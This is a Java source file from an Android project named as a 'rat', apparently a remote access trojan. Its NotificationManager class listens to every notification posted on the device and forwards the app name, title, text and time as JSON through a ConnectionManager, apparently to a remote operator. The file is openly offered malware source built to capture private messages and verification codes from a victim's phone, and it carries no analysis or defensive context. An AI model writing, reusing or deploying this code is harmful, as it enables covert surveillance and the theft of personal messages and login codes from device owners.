package com.wexow.rat.managers;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationManager extends NotificationListenerService {
    private static final String TAG = "NotificationManager";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            Notification n = sbn.getNotification();
            Bundle ext = n.extras;

            String title = ext.getString(Notification.EXTRA_TITLE, "No Title");
            CharSequence txt = ext.getCharSequence(Notification.EXTRA_TEXT);
            String content = txt != null ? txt.toString() : "No Content";

            JSONObject jo = new JSONObject();
            jo.put("type", "notification");
            jo.put("app", pkg);
            jo.put("title", title);
            jo.put("content", content);
            jo.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                .format(new Date()));
            ConnectionManager.send(jo.toString());
        } catch (Exception e) {
            Log.e(TAG, "Notification Error: " + e.getMessage());
        }
    }
}
